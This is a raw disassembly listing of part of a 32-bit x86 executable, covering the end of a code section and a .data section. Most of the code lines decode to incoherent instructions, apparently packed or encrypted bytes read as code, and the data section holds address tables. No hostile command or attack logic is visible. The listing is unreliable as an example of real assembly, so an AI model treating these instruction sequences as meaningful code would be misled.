  41cb61:	int3   
  41cb62:	sbb    BYTE PTR [edx-0x55],bh
  41cb65:	outs   dx,DWORD PTR ds:[esi]
  41cb66:	out    0xa,eax
  41cb68:	pop    ss
  41cb69:	add    dh,cl
  41cb6b:	jecxz  0x41cafd
  41cb6d:	jae    0x41cbba
  41cb6f:	(bad)  
  41cb70:	sub    al,0x35
  41cb72:	mov    ah,0xb3
  41cb74:	pop    esi
  41cb75:	mov    esi,es
  41cb77:	pushf  
  41cb78:	shl    DWORD PTR [ecx],1
  41cb7a:	adc    DWORD PTR [eax+0xfd16f1c],edi
  41cb80:	xchg   edi,eax
  41cb81:	sub    BYTE PTR [ecx],bh
  41cb83:	addr16 pop esp
  41cb85:	push   esp
  41cb86:	leave  
  41cb87:	pop    esp
  41cb88:	ins    DWORD PTR es:[edi],dx
  41cb89:	ins    DWORD PTR es:[edi],dx
  41cb8a:	stos   BYTE PTR es:[edi],al
  41cb8b:	adc    al,0xda
  41cb8d:	add    ah,BYTE PTR gs:[esi+0x77f45ccc]
  41cb94:	enter  0x30e2,0xe3
  41cb98:	jnp    0x41cbc4
  41cb9a:	adc    DWORD PTR [edx-0x39],esi
  41cb9d:	jns    0x41cbe9
  41cb9f:	mov    dh,0x74
  41cba1:	fisttp WORD PTR [edi+0xd511a63]
  41cba7:	sti    
  41cba8:	(bad)  [ebx+0x12a4aa24]
  41cbae:	ja     0x41cbd1
  41cbb0:	fnstcw WORD PTR [esi-0x4238f878]
  41cbb6:	jp     0x41cb74
  41cbb8:	jae    0x41cbc6
  41cbba:	pop    es
  41cbbb:	ret    
  41cbbc:	ins    DWORD PTR es:[edi],dx
  41cbbd:	lock sub DWORD PTR [eax-0x73],eax
  41cbc1:	xor    ecx,DWORD PTR [esi]
  41cbc3:	jno    0x41cb8c
  41cbc5:	inc    edi
  41cbc6:	pop    edi
  41cbc7:	adc    dh,BYTE PTR [esp+edx*2+0x13]
  41cbcb:	fist   DWORD PTR [edx+esi*2-0x4a]
  41cbcf:	push   ebp
  41cbd0:	sub    edx,0xffffffc8
  41cbd3:	sti    
  41cbd4:	mov    cl,0xda
  41cbd6:	sbb    esp,DWORD PTR [ebx]
  41cbd8:	mov    ah,0xa8
  41cbda:	test   DWORD PTR ds:0xbcd3024b,eax
  41cbe0:	or     eax,0x2eb9e6ac
  41cbe5:	push   edi
  41cbe6:	pop    edx
  41cbe7:	xor    DWORD PTR [ebx+0xb],ecx
  41cbea:	sbb    ebx,DWORD PTR [edx+eiz*2-0x59ac2505]
  41cbf1:	mov    eax,ds:0x511d5228
  41cbf6:	pusha  
  41cbf7:	mov    edx,0x721f039a
  41cbfc:	or     bl,BYTE PTR [edi+0x9]
  41cbff:	pop    eax
  41cc00:	(bad)
  41cc03:	jle    0x41cc3a
  41cc05:	xchg   ebp,eax
  41cc06:	add    eax,0x76fe16eb
  41cc0b:	xchg   edi,eax
  41cc0c:	jmp    FWORD PTR [edx+0x37d9c343]
  41cc12:	repnz mov edi,0x8fdebec9
  41cc18:	popa   
  41cc19:	pop    ss
  41cc1a:	sbb    BYTE PTR ds:0xb53cf8c4,cl
  41cc20:	ja     0x41cbc6
  41cc22:	xchg   ecx,ecx
  41cc24:	and    DWORD PTR [ebx],edi
  41cc26:	and    DWORD PTR [ebp+0x6],esi
  41cc29:	mov    ?,WORD PTR [edx+0x5c]
  41cc2c:	cmp    al,0xe6
  41cc2e:	jbe    0x41cc50
  41cc30:	add    esi,DWORD PTR [edx+edx*2+0x1eea725f]
  41cc37:	mov    ah,0x69
  41cc39:	lods   eax,DWORD PTR ds:[esi]
  41cc3a:	je     0x41cc3a
  41cc3c:	xor    esp,0x8f693c4a
  41cc42:	test   DWORD PTR [eax+0x37],ebx
  41cc45:	gs clc 
  41cc47:	mov    al,al
  41cc49:	test   eax,0x3d913e8e
  41cc4e:	xchg   ebx,eax
  41cc4f:	sti    
  41cc50:	aad    0x4b
  41cc52:	adc    al,0x68
  41cc54:	and    edx,DWORD PTR [esi-0x37]
  41cc57:	dec    esi
  41cc58:	int3   
  41cc59:	mov    ecx,0xc3638ef7
  41cc5e:	and    ebx,esp
  41cc60:	push   ds
  41cc61:	adc    al,0x2
  41cc63:	pop    esi
  41cc64:	jns    0x41cce4
  41cc66:	ja     0x41cbf2
  41cc68:	sar    BYTE PTR [edi+0x6b],1
  41cc6b:	cmp    al,BYTE PTR [edi-0x63]
  41cc6e:	inc    ebp
  41cc6f:	adc    BYTE PTR [ebp-0x13],bh
  41cc72:	sub    BYTE PTR ds:0xc1206617,cl
  41cc78:	and    dh,BYTE PTR ds:0xe5444a5d
  41cc7e:	mov    ecx,0x597a08ba
  41cc83:	mov    ds:0x2c34bd7,al
  41cc88:	adc    edx,DWORD PTR [ebx]
  41cc8a:	adc    ebx,esp
  41cc8c:	call   0xc3a6:0xd6028d5f
  41cc93:	sub    ch,BYTE PTR [edi]
  41cc95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc96:	int    0x38
  41cc98:	scas   eax,DWORD PTR es:[edi]
  41cc99:	cs sti 
  41cc9b:	jl     0x41cc20
  41cc9d:	mov    al,ds:0xcfe45dc0
  41cca2:	and    eax,0xef6d43bd
  41cca7:	cmp    dh,0x45
  41ccaa:	dec    ebp
  41ccab:	in     eax,0xd8
  41ccad:	les    ebx,FWORD PTR [eax]
  41ccaf:	adc    ecx,DWORD PTR [eax+0x2f2512f4]
  41ccb5:	scas   eax,DWORD PTR es:[edi]
  41ccb6:	inc    edi
  41ccb7:	outs   dx,DWORD PTR ds:[esi]
  41ccb8:	mov    ah,BYTE PTR [esi]
  41ccba:	add    al,0x36
  41ccbc:	test   DWORD PTR [edi],edx
  41ccbe:	imul   dl
  41ccc0:	jb     0x41cc97
  41ccc2:	mov    eax,ds:0xfffb5892
  41ccc7:	outs   dx,DWORD PTR ds:[esi]
  41ccc8:	cmp    eax,0x31a6b80a
  41cccd:	stc    
  41ccce:	pop    esi
  41cccf:	jno    0x41cd38
  41ccd1:	xor    eax,0x56bba649
  41ccd6:	sub    DWORD PTR ds:0xea444946,ecx
  41ccdc:	loop   0x41cd17
  41ccde:	shl    BYTE PTR [eax],cl
  41cce0:	adc    dh,BYTE PTR [esi-0x7c]
  41cce3:	loope  0x41ccf5
  41cce5:	cmp    esp,DWORD PTR [ecx-0x4dfd398b]
  41cceb:	imul   ecx,DWORD PTR [edi+0x3ea4155e],0xffffffde
  41ccf2:	das    
  41ccf3:	jecxz  0x41ccde
  41ccf5:	adc    edi,DWORD PTR [ebp-0x21]
  41ccf8:	fld    TBYTE PTR [ebx]
  41ccfa:	adc    BYTE PTR [ebx+ebp*4-0x4d],dh
  41ccfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ccff:	(bad)
  41cd03:	push   cs
  41cd04:	mov    dl,0x8c
  41cd06:	dec    edi
  41cd07:	sar    edx,cl
  41cd09:	jns    0x41ccbd
  41cd0b:	repnz inc esp
  41cd0d:	retf   0xc7e6
  41cd10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd11:	dec    ebx
  41cd12:	cwde   
  41cd13:	ret    
  41cd14:	pushf  
  41cd15:	and    eax,0xf9ef472
  41cd1a:	cmp    ch,al
  41cd1c:	mov    ah,0x40
  41cd1e:	add    al,0xa7
  41cd20:	scas   al,BYTE PTR es:[edi]
  41cd21:	mov    esi,0x9cf76267
  41cd26:	call   0x379b:0x971a91af
  41cd2d:	cmp    al,BYTE PTR [edx+ecx*2]
  41cd30:	pop    edx
  41cd31:	fs xchg edx,eax
  41cd33:	sub    BYTE PTR [esp+ebx*1],al
  41cd36:	add    eax,DWORD PTR [ebp+esi*4+0x2d]
  41cd3a:	hlt    
  41cd3b:	ret    0xef67
  41cd3e:	xchg   edi,eax
  41cd3f:	dec    esp
  41cd40:	mov    bh,0xe6
  41cd42:	gs pop ds
  41cd44:	rol    BYTE PTR [ecx+0x1059cc1c],0xb
  41cd4b:	int3   
  41cd4c:	inc    ebx
  41cd4d:	dec    esp
  41cd4e:	mov    al,ds:0xd06142f6
  41cd53:	jecxz  0x41cd69
  41cd55:	adc    DWORD PTR [esi-0x79],esi
  41cd58:	mov    al,0x13
  41cd5a:	inc    ebx
  41cd5b:	mov    al,0x2b
  41cd5d:	call   0xc9f0:0xd14906cf
  41cd64:	mov    dh,dh
  41cd66:	mov    ebp,0xc95bfc6b
  41cd6b:	ret    0x10

Disassembly of section .data:

0041d000 <.data>:
  41d000:	sbb    cl,bl
  41d002:	add    DWORD PTR [eax],eax
  41d004:	fld    DWORD PTR es:[ecx]
  41d007:	add    BYTE PTR [eax],dh
  41d009:	fld    DWORD PTR [ecx]
  41d00b:	add    BYTE PTR [edx],bh
  41d00d:	fld    DWORD PTR [ecx]
  41d00f:	add    BYTE PTR [edx-0x27],al
  41d012:	add    DWORD PTR [eax],eax
  41d014:	dec    esp
  41d015:	fld    DWORD PTR [ecx]
  41d017:	add    BYTE PTR [eax-0x27],bl
  41d01a:	add    DWORD PTR [eax],eax
  41d01c:	(bad)  
  41d01d:	fld    DWORD PTR [ecx]
  41d01f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d023:	add    BYTE PTR [eax-0x27],bh
  41d026:	add    DWORD PTR [eax],eax
  41d028:	sbb    cl,0x1
  41d02b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d031:	fld    DWORD PTR [ecx]
  41d033:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d039:	fld    DWORD PTR [ecx]
  41d03b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d042:	add    DWORD PTR [eax],eax
  41d044:	rcr    cl,1
  41d046:	add    DWORD PTR [eax],eax
  41d048:	loopne 0x41d023
  41d04a:	add    DWORD PTR [eax],eax
  41d04c:	jmp    0x1d9:0xf80001d9
  41d053:	add    BYTE PTR [edx+ebx*8],al
  41d056:	add    DWORD PTR [eax],eax
  41d058:	push   cs
  41d059:	fiadd  DWORD PTR [ecx]
  41d05b:	add    BYTE PTR [edx],bl
  41d05d:	fiadd  DWORD PTR [ecx]
  41d05f:	add    BYTE PTR [edx+ebx*8],ah
  41d062:	add    DWORD PTR [eax],eax
  41d064:	fiadd  DWORD PTR cs:[ecx]
  41d067:	add    BYTE PTR [eax],bh
  41d069:	fiadd  DWORD PTR [ecx]
  41d06b:	add    BYTE PTR [eax-0x26],al
  41d06e:	add    DWORD PTR [eax],eax
  41d070:	dec    esi
  41d071:	fiadd  DWORD PTR [ecx]
  41d073:	add    BYTE PTR [eax-0x26],bl
  41d076:	add    DWORD PTR [eax],eax
  41d078:	fiadd  DWORD PTR fs:[ecx]
  41d07b:	add    BYTE PTR [esi-0x26],ch
  41d07e:	add    DWORD PTR [eax],eax
  41d080:	js     0x41d05c
  41d082:	add    DWORD PTR [eax],eax
  41d084:	xchg   dl,bl
  41d086:	add    DWORD PTR [eax],eax
  41d088:	mov    ds,edx
  41d08a:	add    DWORD PTR [eax],eax
  41d08c:	call   0x1da:0xa40001da
  41d093:	add    BYTE PTR [esi-0x47fffe26],ch
  41d099:	fiadd  DWORD PTR [ecx]
  41d09b:	add    ah,cl
  41d09d:	fiadd  DWORD PTR [ecx]
  41d09f:	add    ah,bl
  41d0a1:	fiadd  DWORD PTR [ecx]
  41d0a3:	add    al,ch
  41d0a5:	fiadd  DWORD PTR [ecx]
  41d0a7:	add    dl,dh
  41d0a9:	fiadd  DWORD PTR [ecx]
  41d0ab:	add    ah,bh
  41d0ad:	fiadd  DWORD PTR [ecx]
  41d0af:	add    BYTE PTR [eax],al
  41d0b1:	add    BYTE PTR [eax],al
  41d0b3:	add    BYTE PTR [edx],dl
  41d0b5:	fild   DWORD PTR [ecx]
  41d0b7:	add    BYTE PTR [eax],dh
  41d0b9:	fild   DWORD PTR [ecx]
  41d0bb:	add    BYTE PTR [eax-0x25],cl
  41d0be:	add    DWORD PTR [eax],eax
  41d0c0:	push   0x7a0001db
  41d0c5:	fild   DWORD PTR [ecx]
  41d0c7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d0cd:	fild   DWORD PTR [ecx]
  41d0cf:	add    dl,al
  41d0d1:	fild   DWORD PTR [ecx]
  41d0d3:	add    dh,dl
  41d0d5:	fild   DWORD PTR [ecx]
  41d0d7:	add    dh,ah
  41d0d9:	fild   DWORD PTR [ecx]
  41d0db:	add    BYTE PTR [edx],al
  41d0dd:	fadd   QWORD PTR [ecx]
  41d0df:	add    BYTE PTR [esp+ebx*8],bl
  41d0e2:	add    DWORD PTR [eax],eax
  41d0e4:	sub    al,0xdc
  41d0e6:	add    DWORD PTR [eax],eax
  41d0e8:	cmp    bl,ah
  41d0ea:	add    DWORD PTR [eax],eax
  41d0ec:	dec    esi
  41d0ed:	fadd   QWORD PTR [ecx]
  41d0ef:	add    BYTE PTR [edx-0x24],bl
  41d0f2:	add    DWORD PTR [eax],eax
  41d0f4:	data16 fadd QWORD PTR [ecx]
  41d0f7:	add    BYTE PTR [eax-0x24],bh
  41d0fa:	add    DWORD PTR [eax],eax
  41d0fc:	mov    bl,ah
  41d0fe:	add    DWORD PTR [eax],eax
  41d100:	pushf  
  41d101:	fadd   QWORD PTR [ecx]
  41d103:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d109:	fadd   QWORD PTR [ecx]
  41d10b:	add    ah,cl
  41d10d:	fadd   QWORD PTR [ecx]
  41d10f:	add    al,ah
  41d111:	fadd   QWORD PTR [ecx]
  41d113:	add    ah,dh
  41d115:	fadd   QWORD PTR [ecx]
  41d117:	add    BYTE PTR [esi],al
  41d119:	fld    QWORD PTR [ecx]
  41d11b:	add    BYTE PTR [esi],dl
  41d11d:	fld    QWORD PTR [ecx]
  41d11f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d126:	add    DWORD PTR [eax],eax
  41d128:	dec    edx
  41d129:	fld    QWORD PTR [ecx]
  41d12b:	add    BYTE PTR [eax-0x23],bl
  41d12e:	add    DWORD PTR [eax],eax
  41d130:	pusha  
  41d131:	fld    QWORD PTR [ecx]
  41d133:	add    BYTE PTR [esi-0x23],ch
  41d136:	add    DWORD PTR [eax],eax
  41d138:	test   ch,bl
  41d13a:	add    DWORD PTR [eax],eax
  41d13c:	mov    ds,ebp
  41d13e:	add    DWORD PTR [eax],eax
  41d140:	sahf   
  41d141:	fld    QWORD PTR [ecx]
  41d143:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d14a:	add    DWORD PTR [eax],eax
  41d14c:	fcmovu st,st(5)
  41d14e:	add    DWORD PTR [eax],eax
  41d150:	out    dx,al
  41d151:	fld    QWORD PTR [ecx]
  41d153:	add    ah,bh
  41d155:	fld    QWORD PTR [ecx]
  41d157:	add    BYTE PTR [eax],cl
  41d159:	fiadd  WORD PTR [ecx]
  41d15b:	add    BYTE PTR [eax],ah
  41d15d:	fiadd  WORD PTR [ecx]
  41d15f:	add    BYTE PTR [edx],dh
  41d161:	fiadd  WORD PTR [ecx]
  41d163:	add    BYTE PTR [edx-0x22],cl
  41d166:	add    DWORD PTR [eax],eax
  41d168:	pop    esp
  41d169:	fiadd  WORD PTR [ecx]
  41d16b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d16f:	add    BYTE PTR [edx-0x71fffe22],al
  41d175:	fiadd  WORD PTR [ecx]
  41d177:	add    BYTE PTR [edx+0x1de],ah
  41d17d:	add    BYTE PTR [eax],al
  41d17f:	add    al,al
  41d181:	fiadd  WORD PTR [ecx]
  41d183:	add    dl,cl
  41d185:	fiadd  WORD PTR [ecx]
  41d187:	add    ah,dl
  41d189:	fiadd  WORD PTR [ecx]
  41d18b:	add    al,ah
  41d18d:	fiadd  WORD PTR [ecx]
  41d18f:	add    ah,dh
  41d191:	fiadd  WORD PTR [ecx]
  41d193:	add    BYTE PTR [eax],al
  41d195:	fild   WORD PTR [ecx]
  41d197:	add    BYTE PTR [edx],bl
  41d199:	fild   WORD PTR [ecx]
  41d19b:	add    BYTE PTR [edx],ch
  41d19d:	fild   WORD PTR [ecx]
  41d19f:	add    BYTE PTR [eax],bh
  41d1a1:	fild   WORD PTR [ecx]
  41d1a3:	add    BYTE PTR [eax-0x21],dl
  41d1a6:	add    DWORD PTR [eax],eax
  41d1a8:	fild   WORD PTR fs:[ecx]
  41d1ab:	add    BYTE PTR [esi-0x21],bh
  41d1ae:	add    DWORD PTR [eax],eax
  41d1b0:	mov    edi,ds
  41d1b2:	add    DWORD PTR [eax],eax
  41d1b4:	cwde   
  41d1b5:	fild   WORD PTR [ecx]
  41d1b7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d1bd:	fild   WORD PTR [ecx]
  41d1bf:	add    dh,al
  41d1c1:	fild   WORD PTR [ecx]
  41d1c3:	add    dh,dl
  41d1c5:	fild   WORD PTR [ecx]
  41d1c7:	add    dh,ah
  41d1c9:	fild   WORD PTR [ecx]
  41d1cb:	add    ah,bh
  41d1cd:	fild   WORD PTR [ecx]
  41d1cf:	add    BYTE PTR [eax],cl
  41d1d1:	loopne 0x41d1d4
  41d1d3:	add    BYTE PTR [eax+eiz*8],dl
  41d1d6:	add    DWORD PTR [eax],eax
  41d1d8:	sub    al,ah
  41d1da:	add    DWORD PTR [eax],eax
  41d1dc:	ds loopne 0x41d1e0
  41d1df:	add    BYTE PTR [esi-0x20],dl
  41d1e2:	add    DWORD PTR [eax],eax
  41d1e4:	data16 loopne 0x41d1e8
  41d1e7:	add    BYTE PTR [edx-0x20],dh
  41d1ea:	add    DWORD PTR [eax],eax
  41d1ec:	xchg   al,ah
  41d1ee:	add    DWORD PTR [eax],eax
  41d1f0:	xchg   esp,eax
  41d1f1:	loopne 0x41d1f4
  41d1f3:	add    BYTE PTR [esi-0x47fffe20],ch
  41d1f9:	loopne 0x41d1fc
  41d1fb:	add    dl,cl
  41d1fd:	loopne 0x41d200
  41d1ff:	add    ah,bl
  41d201:	loopne 0x41d204
  41d203:	add    dh,ch
  41d205:	loopne 0x41d208
  41d207:	add    dh,bh
  41d209:	loopne 0x41d20c
  41d20b:	add    BYTE PTR [eax],cl
  41d20d:	loope  0x41d210
  41d20f:	add    BYTE PTR [esi],bl
  41d211:	loope  0x41d214
  41d213:	add    BYTE PTR [edx],dh
  41d215:	loope  0x41d218
  41d217:	add    BYTE PTR [esi-0x1f],al
  41d21a:	add    DWORD PTR [eax],eax
  41d21c:	push   esi
  41d21d:	loope  0x41d220
  41d21f:	add    BYTE PTR [esi-0x1f],ah
  41d222:	add    DWORD PTR [eax],eax
  41d224:	jb     0x41d207
  41d226:	add    DWORD PTR [eax],eax
  41d228:	test   cl,ah
  41d22a:	add    DWORD PTR [eax],eax
  41d22c:	mov    al,ds:0xb60001e1
  41d231:	loope  0x41d234
  41d233:	add    dl,al
  41d235:	loope  0x41d238
  41d237:	add    dh,dl
  41d239:	loope  0x41d23c
  41d23b:	add    BYTE PTR [eax],al
  41d23d:	add    BYTE PTR [eax],al
  41d23f:	add    ah,dh
  41d241:	loope  0x41d244
  41d243:	add    BYTE PTR [edx+eiz*8],al
  41d246:	add    DWORD PTR [eax],eax
  41d248:	adc    al,0xe2
  41d24a:	add    DWORD PTR [eax],eax
  41d24c:	and    ah,dl
  41d24e:	add    DWORD PTR [eax],eax
  41d250:	xor    dl,ah
  41d252:	add    DWORD PTR [eax],eax
  41d254:	ds loop 0x41d258
  41d257:	add    BYTE PTR [edx-0x1e],dl
  41d25a:	add    DWORD PTR [eax],eax
  41d25c:	pusha  
  41d25d:	loop   0x41d260
  41d25f:	add    BYTE PTR [edx-0x1e],bh
  41d262:	add    DWORD PTR [eax],eax
  41d264:	xchg   dl,ah
  41d266:	add    DWORD PTR [eax],eax
  41d268:	cwde   
  41d269:	loop   0x41d26c
  41d26b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d272:	add    DWORD PTR [eax],eax
  41d274:	int3   
  41d275:	loop   0x41d278
  41d277:	add    dh,dl
  41d279:	loop   0x41d27c
  41d27b:	add    al,ah
  41d27d:	loop   0x41d280
  41d27f:	add    dl,bh
  41d281:	loop   0x41d284
  41d283:	add    BYTE PTR [edx],cl
  41d285:	jecxz  0x41d288
  41d287:	add    BYTE PTR [edx],bl
  41d289:	jecxz  0x41d28c
  41d28b:	add    BYTE PTR [ebx+eiz*8],ah
  41d28e:	add    DWORD PTR [eax],eax
  41d290:	xor    al,0xe3
  41d292:	add    DWORD PTR [eax],eax
  41d294:	inc    eax
  41d295:	jecxz  0x41d298
  41d297:	add    BYTE PTR [esi-0x1d],cl
  41d29a:	add    DWORD PTR [eax],eax
  41d29c:	fs jecxz 0x41d2a0
  41d29f:	add    BYTE PTR [esi-0x1d],dh
  41d2a2:	add    DWORD PTR [eax],eax
  41d2a4:	mov    fs,ebx
  41d2a6:	add    DWORD PTR [eax],eax
  41d2a8:	mov    ds:0xb00001e3,al
  41d2ad:	jecxz  0x41d2b0
  41d2af:	add    dl,al
  41d2b1:	jecxz  0x41d2b4
  41d2b3:	add    dh,cl
  41d2b5:	jecxz  0x41d2b8
  41d2b7:	add    dh,bl
  41d2b9:	jecxz  0x41d2bc
  41d2bb:	add    ah,ch
  41d2bd:	jecxz  0x41d2c0
  41d2bf:	add    BYTE PTR [eax],al
  41d2c1:	in     al,0x1
  41d2c3:	add    BYTE PTR [esi],cl
  41d2c5:	in     al,0x1
  41d2c7:	add    BYTE PTR [edx],ch
  41d2c9:	in     al,0x1
  41d2cb:	add    BYTE PTR [esp+eiz*8],bh
  41d2ce:	add    DWORD PTR [eax],eax
  41d2d0:	dec    esp
  41d2d1:	in     al,0x1
  41d2d3:	add    BYTE PTR [esi-0x1c],bl
  41d2d6:	add    DWORD PTR [eax],eax
  41d2d8:	push   0xffffffe4
  41d2da:	add    DWORD PTR [eax],eax
  41d2dc:	jl     0x41d2c2
  41d2de:	add    DWORD PTR [eax],eax
  41d2e0:	mov    ah,ah
  41d2e2:	add    DWORD PTR [eax],eax
  41d2e4:	cwde   
  41d2e5:	in     al,0x1
  41d2e7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d2ed:	in     al,0x1
  41d2ef:	add    al,dl
  41d2f1:	in     al,0x1
  41d2f3:	add    dl,ah
  41d2f5:	in     al,0x1
  41d2f7:	add    al,dh
  41d2f9:	in     al,0x1
  41d2fb:	add    BYTE PTR [eax],cl
  41d2fd:	in     eax,0x1
  41d2ff:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d306:	add    DWORD PTR [eax],eax
  41d308:	ds in  eax,0x1
  41d30b:	add    BYTE PTR [edx-0x1b],cl
  41d30e:	add    DWORD PTR [eax],eax
  41d310:	pop    edx
  41d311:	in     eax,0x1
  41d313:	add    BYTE PTR [esi-0x1b],ch
  41d316:	add    DWORD PTR [eax],eax
  41d318:	jle    0x41d2ff
  41d31a:	add    DWORD PTR [eax],eax
  41d31c:	nop
  41d31d:	in     eax,0x1
  41d31f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d326:	add    DWORD PTR [eax],eax
  41d328:	mov    eax,0xca0001e5
  41d32d:	in     eax,0x1
  41d32f:	add    dl,bl
  41d331:	in     eax,0x1
  41d333:	add    dh,ah
  41d335:	in     eax,0x1
  41d337:	add    ah,bh
  41d339:	in     eax,0x1
  41d33b:	add    BYTE PTR [esi],cl
  41d33d:	out    0x1,al
  41d33f:	add    BYTE PTR [eax],ch
  41d341:	out    0x1,al
  41d343:	add    BYTE PTR [edx],bh
  41d345:	out    0x1,al
  41d347:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d34b:	add    BYTE PTR [eax-0x1a],bl
  41d34e:	add    DWORD PTR [eax],eax
  41d350:	push   0x7a0001e6
  41d355:	out    0x1,al
  41d357:	add    BYTE PTR [esi-0x67fffe1a],al
  41d35d:	out    0x1,al
  41d35f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d365:	out    0x1,al
  41d367:	add    ah,bl
  41d369:	out    0x1,al
  41d36b:	add    dl,ch
  41d36d:	out    0x1,al
  41d36f:	add    al,bh
  41d371:	out    0x1,al
  41d373:	add    BYTE PTR [esi],cl
  41d375:	out    0x1,eax
  41d377:	add    BYTE PTR [esi],bl
  41d379:	out    0x1,eax
  41d37b:	add    BYTE PTR [edx],ch
  41d37d:	out    0x1,eax
  41d37f:	add    BYTE PTR [edx],bh
  41d381:	out    0x1,eax
  41d383:	add    BYTE PTR [edx-0x19],cl
  41d386:	add    DWORD PTR [eax],eax
  41d388:	pop    esp
  41d389:	out    0x1,eax
  41d38b:	add    BYTE PTR [eax-0x19],ch
  41d38e:	add    DWORD PTR [eax],eax
  41d390:	jbe    0x41d379
  41d392:	add    DWORD PTR [eax],eax
  41d394:	xchg   bh,ah
  41d396:	add    DWORD PTR [eax],eax
  41d398:	cwde   
  41d399:	out    0x1,eax
  41d39b:	add    BYTE PTR [eax-0x45fffe19],ch
  41d3a1:	out    0x1,eax
  41d3a3:	add    al,dl
  41d3a5:	out    0x1,eax
  41d3a7:	add    dh,ah
  41d3a9:	out    0x1,eax
  41d3ab:	add    dh,dh
  41d3ad:	out    0x1,eax
  41d3af:	add    BYTE PTR [edx],al
  41d3b1:	call   0xe859d3b7
  41d3b6:	add    DWORD PTR [eax],eax
  41d3b8:	and    al,0xe8
  41d3ba:	add    DWORD PTR [eax],eax
  41d3bc:	xor    al,0xe8
  41d3be:	add    DWORD PTR [eax],eax
  41d3c0:	dec    eax
  41d3c1:	call   0xe897d3c7
  41d3c6:	add    DWORD PTR [eax],eax
  41d3c8:	callw  0xd3cd
  41d3cc:	jp     0x41d3b6
  41d3ce:	add    DWORD PTR [eax],eax
  41d3d0:	xchg   al,ch
  41d3d2:	add    DWORD PTR [eax],eax
  41d3d4:	xchg   esi,eax
  41d3d5:	call   0xe8e3d3db
  41d3da:	add    DWORD PTR [eax],eax
  41d3dc:	mov    dl,0xe8
  41d3de:	add    DWORD PTR [eax],eax
  41d3e0:	(bad)  
  41d3e1:	call   0xe913d3e7
  41d3e6:	add    DWORD PTR [eax],eax
  41d3e8:	in     al,0xe8
  41d3ea:	add    DWORD PTR [eax],eax
  41d3ec:	lock call 0xe93fd3f3
  41d3f2:	add    DWORD PTR [eax],eax
  41d3f4:	or     al,0xe9
  41d3f6:	add    DWORD PTR [eax],eax
  41d3f8:	sbb    ch,cl
  41d3fa:	add    DWORD PTR [eax],eax
  41d3fc:	add    BYTE PTR [eax],al
  41d3fe:	add    BYTE PTR [eax],al
  41d400:	or     al,0x2
  41d402:	add    BYTE PTR [eax+0x0],al
  41d408:	add    BYTE PTR [eax],al
  41d40a:	add    BYTE PTR [eax],al
  41d40c:	das    
  41d40d:	and    DWORD PTR [ecx*2+0x0],edx
  41d414:	add    al,BYTE PTR [eax]
  41d416:	add    BYTE PTR [eax],al
  41d418:	pop    ebp
  41d419:	add    BYTE PTR [eax],al
  41d41b:	add    BYTE PTR [ebx+ebp*4+0x2],dl
  41d41f:	add    BYTE PTR [ebp+ebx*4+0x2],dl
	...
  41d42b:	add    BYTE PTR [edi],ch
  41d42d:	and    DWORD PTR [ecx*2+0x0],edx
  41d434:	pop    edx
  41d435:	aam    0x1
  41d437:	add    BYTE PTR [ecx],al
  41d439:	add    BYTE PTR [eax],al
  41d43b:	add    BYTE PTR [ecx],al
  41d43d:	add    BYTE PTR [eax],al
  41d43f:	add    BYTE PTR [ecx],al
  41d441:	add    BYTE PTR [eax],al
  41d443:	add    BYTE PTR [eax-0x2c],dl
  41d446:	add    DWORD PTR [eax],eax
  41d448:	push   esp
  41d449:	aam    0x1
  41d44b:	add    BYTE PTR [eax-0x2c],bl
  41d44e:	add    DWORD PTR [eax],eax
  41d450:	xchg   edi,eax
  41d451:	inc    ebx
  41d452:	add    BYTE PTR [eax],al
  41d454:	imul   edx,esp,0x1
  41d457:	add    BYTE PTR [eax],al
  41d459:	add    BYTE PTR [eax+ebp*2+0x58],ah
  41d45d:	xor    dl,BYTE PTR [eax+0x78]
  41d460:	jp     0x41d4aa
  41d462:	jp     0x41d4d5
  41d464:	outs   dx,BYTE PTR ds:[esi]
  41d465:	je     0x41d495
  41d467:	je     0x41d4d2
  41d469:	jo     0x41d46b
  41d46b:	aas    
  41d46c:	dec    eax
  41d46d:	imul   esp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  41d475:	gs jb  0x41d4c7
  41d478:	jb     0x41d4e3
  41d47a:	imul   ebp,DWORD PTR [bp+0x61],0x5940406c
  41d482:	inc    edi
  41d483:	inc    esi
  41d484:	dec    ebx
  41d485:	push   eax
  41d486:	inc    ecx
  41d487:	dec    ecx
  41d488:	push   eax
  41d489:	inc    ecx
  41d48a:	inc    esp
  41d48b:	cmp    al,0x56
	...
  41d495:	add    BYTE PTR [eax],al
  41d497:	add    BYTE PTR [eax],dl
  41d499:	aad    0x1
	...
  41d4a3:	add    BYTE PTR [esi],al
  41d4a5:	fild   DWORD PTR [ecx]
  41d4a7:	add    BYTE PTR [eax],al
  41d4a9:	rol    BYTE PTR [ecx],1
  41d4ab:	add    ah,al
  41d4ad:	aad    0x1
	...
  41d4b7:	add    BYTE PTR [edx-0x4bfffe22],dh
  41d4bd:	rol    BYTE PTR [ecx],1
  41d4bf:	add    BYTE PTR [eax+0x1d6],dl
  41d4c5:	add    BYTE PTR [eax],al
  41d4c7:	add    BYTE PTR [eax],al
  41d4c9:	add    BYTE PTR [eax],al
  41d4cb:	add    dl,ch
  41d4cd:	loope  0x41d4d0
  41d4cf:	add    BYTE PTR [eax+0x500001d1],al
  41d4d5:	xlat   BYTE PTR ds:[ebx]
  41d4d6:	add    DWORD PTR [eax],eax
	...
  41d4e0:	ss jmp 0xd281d4e7
  41d4e6:	add    DWORD PTR [eax],eax
  41d4e8:	adc    cl,bl
